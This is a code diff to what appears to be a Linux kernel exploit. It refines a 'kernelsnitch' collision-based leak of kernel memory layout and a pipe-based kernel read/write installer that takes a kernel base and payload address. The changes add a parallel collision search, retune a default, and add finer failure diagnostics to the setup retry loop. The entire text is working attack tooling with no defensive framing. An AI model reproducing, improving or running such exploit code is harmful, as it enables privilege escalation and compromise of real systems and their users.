@@ -34,6 +34,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(
     size_t mm_struct_sz, size_t mm_slab_order, size_t thread_cnt,
     size_t collision_cnt, size_t verbose, size_t mte_enabled);
 void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks);
+void kernelsnitch_find_collisions_parallel(struct kernelsnitch_shared_state *ks);
 size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks);
 void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks);
 size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks);
@@ -45,7 +46,7 @@ void kernelsnitch_set_profile(struct kernelsnitch_shared_state *ks,
  * is opaque in this TU so it is passed explicitly. */
 #define OSS_KSNITCH_AVERAGE 8
 #define OSS_KSNITCH_REPEAT_DEFAULT 128
-#define OSS_KSNITCH_APPENDED_DEFAULT 4096
+#define OSS_KSNITCH_APPENDED_DEFAULT 2048
 
 #define OSS_PAGE_SIZE 0x1000ULL
 #define OSS_PAGE_MASK (OSS_PAGE_SIZE - 1)
@@ -158,9 +159,18 @@ enum pipe_error {
   PIPE_E_INSTALL_TIMEOUT,
 };
 
+enum pipe_collision_failure {
+  PIPE_COLLISION_NONE = 0,
+  PIPE_COLLISION_SPAWN,
+  PIPE_COLLISION_POST_MEMFD,
+  PIPE_COLLISION_LEAK_MEMFD,
+  PIPE_COLLISION_NOT_FOUND,
+};
+
 struct pipe_prepare_progress {
   atomic_int stage;
   atomic_int error_no;
+  atomic_int collision_failure;
   atomic_uint_fast64_t entered_ms[PIPE_STAGE_COUNT];
 };
 
@@ -168,6 +178,7 @@ struct pipe_attempt_diag {
   enum pipe_error error;
   enum pipe_prepare_stage stage;
   int error_no;
+  enum pipe_collision_failure collision_failure;
   uint64_t elapsed_ms;
 };
 
@@ -240,6 +251,17 @@ static const char *pipe_error_name(enum pipe_error error) {
   case PIPE_E_WRITE_PROOF: return "write-proof";
   case PIPE_E_RESTORE: return "restore";
   case PIPE_E_INSTALL_TIMEOUT: return "install-timeout";
+  }
+  return "unknown";
+}
+
+static const char *pipe_collision_failure_name(enum pipe_collision_failure failure) {
+  switch (failure) {
+  case PIPE_COLLISION_NONE: return "none";
+  case PIPE_COLLISION_SPAWN: return "spawn";
+  case PIPE_COLLISION_POST_MEMFD: return "post-memfd";
+  case PIPE_COLLISION_LEAK_MEMFD: return "leak-memfd";
+  case PIPE_COLLISION_NOT_FOUND: return "not-found";
   }
   return "unknown";
 }
@@ -395,7 +417,7 @@ static pid_t spawn_collision_child(void) {
     if (getppid() == 1) {
       _exit(1);
     }
-    kernelsnitch_find_collisions(g_ks);
+    kernelsnitch_find_collisions_parallel(g_ks);
     _exit(0);
   }
   return child;
@@ -524,8 +546,7 @@ static uint64_t prepare_pipe_page_child(
   }
   {
     long ks_appended = pipe_env_long_clamped(
-        "KSNITCH_APPENDED", OSS_KSNITCH_APPENDED_DEFAULT, 256,
-        OSS_KSNITCH_APPENDED_DEFAULT);
+        "KSNITCH_APPENDED", OSS_KSNITCH_APPENDED_DEFAULT, 256, 4096);
     long ks_repeat = pipe_env_long_clamped(
         "KSNITCH_REPEAT", OSS_KSNITCH_REPEAT_DEFAULT, OSS_KSNITCH_AVERAGE,
         OSS_KSNITCH_REPEAT_DEFAULT);
@@ -536,11 +557,20 @@ static uint64_t prepare_pipe_page_child(
   }
   set_prepare_progress(progress, PIPE_STAGE_COLLISIONS);
   leak_child = spawn_collision_child();
-  if (leak_child < 0 || !fill_dead_mm_ctx(&post)) {
+  if (leak_child < 0) {
+    atomic_store_explicit(&progress->collision_failure, PIPE_COLLISION_SPAWN,
+                          memory_order_release);
+    goto out;
+  }
+  if (!fill_dead_mm_ctx(&post)) {
+    atomic_store_explicit(&progress->collision_failure,
+                          PIPE_COLLISION_POST_MEMFD, memory_order_release);
     goto out;
   }
   leak_memfd = open_child_mem(leak_child);
   if (leak_memfd < 0) {
+    atomic_store_explicit(&progress->collision_failure,
+                          PIPE_COLLISION_LEAK_MEMFD, memory_order_release);
     goto out;
   }
 
@@ -551,6 +581,8 @@ static uint64_t prepare_pipe_page_child(
   }
   leak_child = -1;
   if (!kernelsnitch_found_collisions(g_ks)) {
+    atomic_store_explicit(&progress->collision_failure,
+                          PIPE_COLLISION_NOT_FOUND, memory_order_release);
     goto out;
   }
 
@@ -701,6 +733,7 @@ static uint64_t prepare_pipe_page(int timeout_ms, struct pipe_attempt_diag *diag
   }
   atomic_init(&progress->stage, PIPE_STAGE_BANKS);
   atomic_init(&progress->error_no, 0);
+  atomic_init(&progress->collision_failure, PIPE_COLLISION_NONE);
   for (int stage = PIPE_STAGE_IDLE; stage <= PIPE_STAGE_DONE; stage++) {
     atomic_init(&progress->entered_ms[stage], 0);
   }
@@ -794,6 +827,8 @@ static uint64_t prepare_pipe_page(int timeout_ms, struct pipe_attempt_diag *diag
   }
   diag->stage = (enum pipe_prepare_stage)atomic_load_explicit(
       &progress->stage, memory_order_acquire);
+  diag->collision_failure = (enum pipe_collision_failure)atomic_load_explicit(
+      &progress->collision_failure, memory_order_acquire);
   if (!diag->error_no) {
     diag->error_no = atomic_load_explicit(&progress->error_no,
                                           memory_order_acquire);
@@ -1618,6 +1653,7 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
       error = PIPE_E_PREPARE;
     }
     enum pipe_prepare_stage failed_stage = diag.stage;
+    enum pipe_collision_failure collision_failure = diag.collision_failure;
     int failed_errno = diag.error_no;
     uint64_t attempt_ms = diag.elapsed_ms +
                           (monotonic_ms() - establish_started_ms);
@@ -1632,10 +1668,11 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
     }
     oss_pipe_rw_reset();
     fprintf(stderr,
-            "[pipe_rw] setup miss attempt=%d/%d reason=%s stage=%s errno=%d "
+            "[pipe_rw] setup miss attempt=%d/%d reason=%s stage=%s detail=%s errno=%d "
             "elapsed_ms=%llu\n",
             attempt, OSS_PIPE_ATTEMPTS, pipe_error_name(error),
-            pipe_stage_name(failed_stage), failed_errno,
+            pipe_stage_name(failed_stage),
+            pipe_collision_failure_name(collision_failure), failed_errno,
             (unsigned long long)attempt_ms);
     if (error == PIPE_E_READ_PROOF || error == PIPE_E_WRITE_PROOF) {
       usleep((useconds_t)(attempt * 2000));
